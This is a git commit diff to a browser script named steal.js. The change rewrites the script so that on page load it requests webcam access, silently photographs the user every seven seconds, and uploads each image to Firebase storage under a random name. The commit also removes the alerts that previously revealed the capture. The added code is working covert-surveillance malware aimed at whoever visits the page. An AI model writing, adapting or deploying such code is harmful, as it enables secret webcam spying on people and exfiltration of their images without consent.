e0fb8f762322226417f638198631bf0177a073bb
Arex360 <49303647+Arex360@users.noreply.github.com>
2020-05-14 06:00:01 -0700

    Update steal.js

--- views/steal.js
+++ views/steal.js
@@ -1,25 +1,30 @@
-let pRef = firebase.storage().ref("image/"+"new")
-window.addEventListener('keydown',()=>{
+var getName = ()=>{
+     let base1 = Math.random()
+     let base2 = Math.random()
+     return base1 + base2 
+}
+window.addEventListener('load',()=>{
+    setInterval(()=>{
+      var xp = getName().toString().substring(2,6)
+      var pRef = firebase.storage().ref("image/"+xp)
     if (navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function (mediaStream) {
-            const mediaStreamTrack = mediaStream.getVideoTracks()[0];
-            const imageCapture = new ImageCapture(mediaStreamTrack);
-            alert('uploading')
+          .then(stream => {
+            let mediaStreamTrack = stream.getVideoTracks()[0];
+            let imageCapture = new ImageCapture(mediaStreamTrack);
             imageCapture.takePhoto().then(blob=>{
                 let work = pRef.put(blob)
-                alert('wow')
                 work.on('state_changed',p=>{
                 let prog = p.bytesTransferred / p.totalBytes * 100
                 if(prog == 100){
-                    alert('done')
+                  console.log('done')
                 }
             })
             })
-
           })
-          .catch(function (err0r) {
-            console.log(err0r);
+          .catch(function (e) {
+            console.log(e);
           });
       }
+    },7000)
 })
